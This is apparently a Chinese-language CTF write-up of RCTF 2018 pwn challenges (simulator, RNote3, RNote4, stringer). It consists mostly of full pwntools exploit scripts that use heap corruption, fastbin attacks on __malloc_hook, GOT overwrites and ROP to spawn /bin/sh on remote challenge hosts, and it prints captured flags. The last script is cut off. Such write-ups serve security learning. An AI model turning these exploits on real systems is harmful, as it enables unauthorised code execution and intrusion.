<span class="n">alloc</span><span class="p">(</span><span class="mh">0xa8</span><span class="p">,</span><span class="s1">'2'</span><span class="o">*</span><span class="mi">8</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span><span class="o">*</span><span class="mi">10</span><span class="o">+</span><span class="s1">'</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="mh">0x100</span><span class="p">,</span><span class="s1">'3</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>

<span class="c1">#-----------off by null-------------</span>
<span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="mh">0x48</span><span class="p">,</span><span class="s1">'a'</span><span class="o">*</span><span class="mh">0x48</span><span class="p">)</span>


<span class="c1">#----------chunk overlap--------</span>
<span class="n">alloc</span><span class="p">(</span><span class="mh">0x88</span><span class="p">,</span><span class="s1">'1</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span><span class="s1">'4</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>

<span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">delete</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>


<span class="c1">#-----------leak libc----------------</span>
<span class="n">alloc</span><span class="p">(</span><span class="mh">0x88</span><span class="p">,</span><span class="s1">'1</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>

<span class="n">libc</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="n">show</span><span class="p">(</span><span class="mi">4</span><span class="p">)[:</span><span class="mi">6</span><span class="p">]</span><span class="o">+</span><span class="s1">'</span><span class="se">\x00\x00</span><span class="s1">'</span><span class="p">)</span>
<span class="n">base</span><span class="o">=</span><span class="n">libc</span><span class="o">-</span><span class="mh">0x3C4B78</span>

<span class="n">malloc_hook</span><span class="o">=</span><span class="n">base</span><span class="o">+</span><span class="n">e</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">'__malloc_hook'</span><span class="p">]</span>



<span class="c1">#-----------fast bin attack-----------</span>
<span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="n">alloc</span><span class="p">(</span><span class="mh">0xa8</span><span class="p">,</span><span class="s1">'a'</span><span class="o">*</span><span class="mh">0x88</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x71</span><span class="p">)</span><span class="o">+</span><span class="s1">'</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
<span class="n">delete</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
<span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="mh">0xa8</span><span class="p">,</span><span class="s1">'a'</span><span class="o">*</span><span class="mh">0x88</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x71</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">malloc_hook</span><span class="o">-</span><span class="mh">0x23</span><span class="p">)</span><span class="o">+</span><span class="s1">'</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span><span class="s1">'t</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span><span class="s1">'a'</span><span class="o">*</span><span class="mi">3</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">base</span><span class="o">+</span><span class="mh">0xf1147</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">base</span><span class="o">+</span><span class="mh">0x846D0</span><span class="p">)</span><span class="o">+</span><span class="s1">'</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">base</span><span class="p">))</span>

<span class="k">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">base</span><span class="o">+</span><span class="mh">0x846D0</span><span class="p">))</span>

<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></div>
<p>flag: <strong>RCTF{Let_us_w4rm_up_with_a_e4sy_NU11_byte_overflow_lul_7adf58}</strong></p>
<h3 data-content="1" id="c216a89bbaf39dbc698502fa7ece0264"><strong>simulator</strong></h3>
<p>这是一个mips的指令模拟器，先输入mips的汇编代码，然后会解析成二进制，之后根据二进制来执行对应的操作，在主函数那里貌似有一个栈溢出，但是leak不出来cookie…….</p>
<p>基本操作有这些，syscall 只实现了一个，就是print int，感觉可以利用lw<br/>
和sw进行任意地址读写</p>
<p>然后将 ___stack_chk_fail 的got 写改成 ret 的地址，就可以用栈溢出随便玩了<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20180522100938-2e586bc0-5d65-1.png"/><br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20180522100938-2e6127e2-5d65-1.png"/></p>
<p>漏洞点在这里，没有判断小于0的情况</p>
<pre><code>li \$a0,1883262208  
li \$a1,1883262209  
add \$a0,\$a0,\$a1  
lw \$a0,\$a0
li \$v0,1
syscall
END</code></pre>
<p>利用这个payload可以打印got中某个地址的值</p>
<p>这里可以劫持控制流</p>
<pre><code>li $a0,1883262209
li $a1,1883262210
add $a1,$a0,$a1
move $a0,$a1
lw $a0,$a0
li $v0,1
syscall
move $a0,$a1
li $v0,134523991
sw $v0,$a0
END</code></pre>
<p>输完这个payload之后，就可以栈溢出</p>
<p>弄了半天ret2dlresolve，然后发现找libc快多了..........</p>
<p>下面是payload</p>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">hashlib</span> <span class="kn">import</span> <span class="n">sha256</span>
<span class="kn">import</span> <span class="nn">itertools</span>
<span class="kn">import</span> <span class="nn">roputils</span>

<span class="n">debug</span><span class="o">=</span><span class="mi">0</span>
<span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">'debug'</span>
<span class="n">rop</span><span class="o">=</span><span class="n">roputils</span><span class="o">.</span><span class="n">ROP</span><span class="p">(</span><span class="s1">'./simulator'</span><span class="p">)</span>
<span class="k">if</span> <span class="n">debug</span><span class="p">:</span>
    <span class="n">p</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s1">'simulator'</span><span class="p">)</span>
    <span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">'debug'</span>
    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
    <span class="n">e</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s1">'/lib/i386-linux-gnu/libc-2.24.so'</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">p</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s1">'simulator.2018.teamrois.cn'</span><span class="p">,</span> <span class="mi">3131</span><span class="p">)</span>
    <span class="n">e</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s1">'./libc.so'</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">ru</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">se</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>

<span class="n">s</span><span class="o">=</span><span class="n">string</span><span class="o">.</span><span class="n">letters</span><span class="o">+</span><span class="n">string</span><span class="o">.</span><span class="n">digits</span>
<span class="k">if</span> <span class="n">debug</span><span class="o">==</span><span class="mi">0</span><span class="p">:</span>
    <span class="n">chal</span><span class="o">=</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">itertools</span><span class="o">.</span><span class="n">permutations</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="mi">4</span><span class="p">):</span>
        <span class="n">sol</span><span class="o">=</span><span class="s1">''</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">sha256</span><span class="p">(</span><span class="n">chal</span> <span class="o">+</span> <span class="n">sol</span><span class="p">)</span><span class="o">.</span><span class="n">digest</span><span class="p">()</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s1">'</span><span class="se">\0\0\0</span><span class="s1">'</span><span class="p">):</span>
            <span class="k">break</span>
    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">sol</span><span class="p">)</span>

<span class="n">payload</span><span class="o">=</span><span class="s1">'''</span>
<span class="s1">li $a0,1883262209</span>
<span class="s1">li $a1,1883262210</span>
<span class="s1">add $a1,$a0,$a1</span>
<span class="s1">move $a0,$a1</span>
<span class="s1">lw $a0,$a0</span>
<span class="s1">li $v0,1</span>
<span class="s1">syscall</span>
<span class="s1">move $a0,$a1</span>
<span class="s1">li $v0,134523991</span>
<span class="s1">sw $v0,$a0</span>
<span class="s1">END</span>
<span class="s1">'''</span>

<span class="n">se</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="n">puts</span><span class="o">=</span><span class="mh">0x080485C0</span>
<span class="n">main_addr</span><span class="o">=</span><span class="mh">0x804AC23</span>
<span class="n">bss_tmp</span><span class="o">=</span><span class="mh">0x804DB20</span><span class="o">+</span><span class="mh">0x100</span>
<span class="n">pret</span><span class="o">=</span><span class="mh">0x804B33B</span>

<span class="n">tpayload</span><span class="o">=</span><span class="s1">'a'</span><span class="o">*</span><span class="mi">44</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">bss_tmp</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">puts</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">main_addr</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0x0804D010</span><span class="p">)</span>

<span class="n">ru</span><span class="p">(</span><span class="s1">'leave a comment: '</span><span class="p">)</span>
<span class="n">se</span><span class="p">(</span><span class="n">tpayload</span><span class="o">+</span><span class="s1">'</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>

<span class="n">printf</span><span class="o">=</span><span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
<span class="n">base</span><span class="o">=</span><span class="n">printf</span><span class="o">-</span><span class="n">e</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">'printf'</span><span class="p">]</span>

<span class="n">system</span><span class="o">=</span><span class="n">base</span><span class="o">+</span><span class="n">e</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">'system'</span><span class="p">]</span>
<span class="n">binsh</span><span class="o">=</span><span class="n">base</span><span class="o">+</span><span class="n">e</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">'/bin/sh'</span><span class="p">)</span><span class="o">.</span><span class="n">next</span><span class="p">()</span>

<span class="n">rpayload</span><span class="o">=</span><span class="s1">'a'</span><span class="o">*</span><span class="mi">48</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">system</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">binsh</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span>

<span class="n">se</span><span class="p">(</span><span class="n">rpayload</span><span class="o">+</span><span class="s1">'</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></div>
<p>flag: <strong>RCTF{5imu_s1mu_sinnu_siml_l_simulator!_7a3dac}</strong></p>
<h3 data-content="1" id="82458aab3522c2553ffbe4842dd9c952"><strong>RNote3</strong></h3>
<p>漏洞在delete那里.....未初始化变量......看了栈溢出那里半天....难受</p>
<p>delete函数未初始化变量，所以可以delete 任意一块地方</p>
<p>具体是先view了某一个想delete的堆，然后堆地址保存在栈上，然后这个时候进delete函数，随便输一个东西，然后因为找不到对应的堆，然后<br/>
i 这个时候是31，但是free的是栈上面的那个变量，所以可以use after<br/>
free，之后一个fastbin attack过去就可以了</p>
<p>payload 如下</p>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">debug</span><span class="o">=</span><span class="mi">0</span>
<span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">'debug'</span>
<span class="n">e</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s1">'./libc.so'</span><span class="p">)</span>
<span class="k">if</span> <span class="n">debug</span><span class="p">:</span>
    <span class="n">p</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s1">'RNote3'</span><span class="p">,</span><span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s1">'LD_PRELOAD'</span><span class="p">:</span><span class="s1">'./libc.so'</span><span class="p">})</span>
    <span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">'debug'</span>
    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">p</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s1">'rnote3.2018.teamrois.cn'</span><span class="p">,</span><span class="mi">7322</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">ru</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">se</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">title</span><span class="p">,</span><span class="n">sz</span><span class="p">,</span><span class="n">content</span><span class="p">):</span>
    <span class="n">se</span><span class="p">(</span><span class="s1">'1</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
    <span class="n">ru</span><span class="p">(</span><span class="s1">'please input title:'</span><span class="p">)</span>
    <span class="n">se</span><span class="p">(</span><span class="n">title</span><span class="p">)</span>
    <span class="n">ru</span><span class="p">(</span><span class="s1">'please input content size:'</span><span class="p">)</span>
    <span class="n">se</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">sz</span><span class="p">)</span><span class="o">+</span><span class="s1">'</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
    <span class="n">ru</span><span class="p">(</span><span class="s1">'please input content:'</span><span class="p">)</span>
    <span class="n">se</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
    <span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">title</span><span class="p">):</span>
    <span class="n">se</span><span class="p">(</span><span class="s1">'2</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
    <span class="n">ru</span><span class="p">(</span><span class="s1">'please input note title: '</span><span class="p">)</span>
    <span class="n">se</span><span class="p">(</span><span class="n">title</span><span class="p">)</span>
    <span class="n">ru</span><span class="p">(</span><span class="s1">'note content: '</span><span class="p">)</span>
    <span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">title</span><span class="p">,</span><span class="n">content</span><span class="p">):</span>
    <span class="n">se</span><span class="p">(</span><span class="s1">'3</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
    <span class="n">ru</span><span class="p">(</span><span class="s1">'please input note title:'</span><span class="p">)</span>
    <span class="n">se</span><span class="p">(</span><span class="n">title</span><span class="p">)</span>
    <span class="n">ru</span><span class="p">(</span><span class="s1">'please input new content: '</span><span class="p">)</span>
    <span class="n">se</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
    <span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">title</span><span class="p">):</span>
    <span class="n">se</span><span class="p">(</span><span class="s1">'4</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
    <span class="n">ru</span><span class="p">(</span><span class="s1">'please input note title: '</span><span class="p">)</span>
    <span class="n">se</span><span class="p">(</span><span class="n">title</span><span class="p">)</span>
    <span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>


<span class="n">add</span><span class="p">(</span><span class="s1">'1</span><span class="se">\n</span><span class="s1">'</span><span class="p">,</span><span class="mh">0xa0</span><span class="p">,</span><span class="s1">'a</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="s1">'2</span><span class="se">\n</span><span class="s1">'</span><span class="p">,</span><span class="mh">0xa0</span><span class="p">,</span><span class="s1">'b</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
<span class="n">show</span><span class="p">(</span><span class="s1">'1</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
<span class="n">delete</span><span class="p">(</span><span class="s1">'a</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
<span class="n">show</span><span class="p">(</span><span class="s1">'</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>

<span class="n">libc</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">+</span><span class="s1">'</span><span class="se">\x00\x00</span><span class="s1">'</span><span class="p">)</span>
<span class="n">base</span><span class="o">=</span><span class="n">libc</span><span class="o">-</span><span class="mh">0x3C4B78</span>

<span class="n">malloc_hook</span><span class="o">=</span><span class="n">base</span><span class="o">+</span><span class="n">e</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">'__malloc_hook'</span><span class="p">]</span>

<span class="n">add</span><span class="p">(</span><span class="s1">'3</span><span class="se">\n</span><span class="s1">'</span><span class="p">,</span><span class="mh">0xa0</span><span class="p">,</span><span class="s1">'c</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="s1">'4</span><span class="se">\n</span><span class="s1">'</span><span class="p">,</span><span class="mh">0x68</span><span class="p">,</span><span class="s1">'d</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="s1">'5</span><span class="se">\n</span><span class="s1">'</span><span class="p">,</span><span class="mh">0x68</span><span class="p">,</span><span class="s1">'e</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>

<span class="n">show</span><span class="p">(</span><span class="s1">'4</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
<span class="n">delete</span><span class="p">(</span><span class="s1">'a</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="s1">'</span><span class="se">\n</span><span class="s1">'</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">malloc_hook</span><span class="o">-</span><span class="mh">0x23</span><span class="p">)</span><span class="o">+</span><span class="s1">'</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="s1">'6</span><span class="se">\n</span><span class="s1">'</span><span class="p">,</span><span class="mh">0x68</span><span class="p">,</span><span class="s1">'f</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="s1">'7</span><span class="se">\n</span><span class="s1">'</span><span class="p">,</span><span class="mh">0x68</span><span class="p">,</span><span class="s1">'a'</span><span class="o">*</span><span class="mi">3</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">base</span><span class="o">+</span><span class="mh">0x4526a</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">base</span><span class="o">+</span><span class="mh">0x846D0</span><span class="p">)</span><span class="o">+</span><span class="s1">'</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>

<span class="n">se</span><span class="p">(</span><span class="s1">'1</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></div>
<p>flag:<strong>RCTF{P1e4se_Be_C4refu1_W1th_Th3_P0inter_3c3d89}</strong></p>
<h3 data-content="1" id="09ce2d35cbdeb317f6bae34dcd4ae372"><strong>RNote4</strong></h3>
<p>堆溢出，可以变成任意写...</p>
<p>然后改掉DT_STRTAB的值，改到bss段的一个地方，之后往上面放system，然后delete掉一个堆，这个时候会调用free，然后因为free是第一次被调用，会调用dl_resolve来找在libc中的地址<br/>
，因为改了DT_STRTAB，所以会找到sysytem，变成调用system(“/bin/sh”);，之后就get<br/>
shell了</p>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">debug</span><span class="o">=</span><span class="mi">0</span>
<span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">'debug'</span>
<span class="k">if</span> <span class="n">debug</span><span class="p">:</span>
    <span class="n">p</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s1">'RNote4'</span><span class="p">,</span><span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s1">'LD_PRELOAD'</span><span class="p">:</span><span class="s1">'./libc.so'</span><span class="p">})</span>
    <span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">'debug'</span>
    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">p</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s1">'rnote4.2018.teamrois.cn'</span><span class="p">,</span><span class="mi">6767</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">ru</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">se</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">sz</span><span class="p">,</span><span class="n">content</span><span class="p">):</span>
    <span class="n">se</span><span class="p">(</span><span class="s1">'</span><span class="se">\x01</span><span class="s1">'</span><span class="p">)</span>
    <span class="n">se</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">sz</span><span class="p">))</span>
    <span class="n">se</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span><span class="n">sz</span><span class="p">,</span><span class="n">content</span><span class="p">):</span>
    <span class="n">se</span><span class="p">(</span><span class="s1">'</span><span class="se">\x02</span><span class="s1">'</span><span class="p">)</span>
    <span class="n">se</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="n">se</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">sz</span><span class="p">))</span>
    <span class="n">se</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">se</span><span class="p">(</span><span class="s1">'</span><span class="se">\x03</span><span class="s1">'</span><span class="p">)</span>
    <span class="n">se</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>


<span class="k">def</span> <span class="nf">write</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span><span class="n">content</span><span class="p">):</span>
    <span class="n">payload</span><span class="o">=</span><span class="s1">'a'</span><span class="o">*</span><span class="mh">0x18</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x18</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
    <span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span><span class="n">payload</span><span class="p">)</span>
    <span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">content</span><span class="p">),</span><span class="n">content</span><span class="p">)</span>

<span class="n">add</span><span class="p">(</span><span class="mh">0x18</span><span class="p">,</span><span class="s1">'a'</span><span class="o">*</span><span class="mh">0x18</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="mh">0x18</span><span class="p">,</span><span class="s1">'b'</span><span class="o">*</span><span class="mh">0x18</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="mh">0x8</span><span class="p">,</span><span class="s1">'/bin/sh</span><span class="se">\x00</span><span class="s1">'</span><span class="p">)</span>

<span class="n">write</span><span class="p">(</span><span class="mh">0x601EB0</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x602100</span><span class="p">))</span>
<span class="n">write</span><span class="p">(</span><span class="mh">0x602100</span><span class="p">,</span><span class="s1">'a'</span><span class="o">*</span><span class="mh">0x5F</span><span class="o">+</span><span class="s1">'system'</span><span class="p">)</span>
<span class="n">delete</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></div>
<p>flag:<strong>RCTF{I_kn0w_h0w_dl_f1xup_w0rks_503f8c}</strong></p>
<h3 data-content="1" id="48387acf6ad224ceba0bbf95ed462ee3"><strong>stringer</strong></h3>
<p>readstr 末尾不会强制+0</p>
<p>*(_BYTE *)(size - 1 + p) = 0;</p>
<p>根据size 来，可leak</p>
<p>calloc 会清空原来chunk上的内容,libc 2.23 设置 is_mmap bit 可以绕过</p>
<p>del 有 uaf</p>
<p>结合起来 构造 overlap + uaf</p>
<p>使用 edit 功能可以构造出来一个 overlap</p>
<p>有对齐。改最后一个 byte是不行的了，尝试第二个byte</p>
<p>almost</p>
<p>get it</p>
<p>思路</p>
<p>edit 修改 fastbin 的第二个byte 造成偏移</p>
<p>在偏移位置写一个 fake fastbin</p>
<p>libc 2.23 版本 calloc的时候如果 is_mmap bit 被设置了，不会清空</p>
<p>使用fake fastbin 修改一个 unsorted bin 的size 造成overlap</p>
<p>后面就是 leak 然后fastbin attack 的常规套路了</p>
<div class="highlight"><pre><span></span><span class="c1">#coding:utf-8</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">time</span>

<span class="n">file_addr</span><span class="o">=</span><span class="s1">'./stringer'</span>
<span class="n">libc_addr</span><span class="o">=</span><span class="s1">'./libc.so.6'</span>
<span class="n">host</span><span class="o">=</span><span class="s1">'stringer.2018.teamrois.cn'</span>
<span class="n">port</span><span class="o">=</span><span class="mi">7272</span>

<span class="n">libc</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="err">‘</span><span class="o">./</span><span class="n">libc</span><span class="o">.</span><span class="n">so</span><span class="o">.</span><span class="mi">6</span><span class="err">’</span><span class="p">)</span>
<span class="n">p</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>


<span class="n">malloc_hook_off</span><span class="o">=</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">'__malloc_hook'</span><span class="p">]</span>
<span class="n">free_hook_off</span><span class="o">=</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">'__free_hook'</span><span class="p">]</span>
<span class="n">unsorted_off</span><span class="o">=</span><span class="n">malloc_hook_off</span><span class="o">+</span><span class="mi">88</span><span class="o">+</span><span class="mh">0x10</span>
<span class="n">fake_fastbin_malloc_hook</span><span class="o">=</span><span class="n">unsorted_off</span><span class="o">-</span><span class="mi">88</span><span class="o">-</span><span class="mh">0x13</span><span class="o">-</span><span class="mh">0x20</span>


<span class="k">def</span> <span class="nf">menu</span><span class="p">(</span><span class="n">op</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'choice:'</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">op</span><span class="p">))</span>

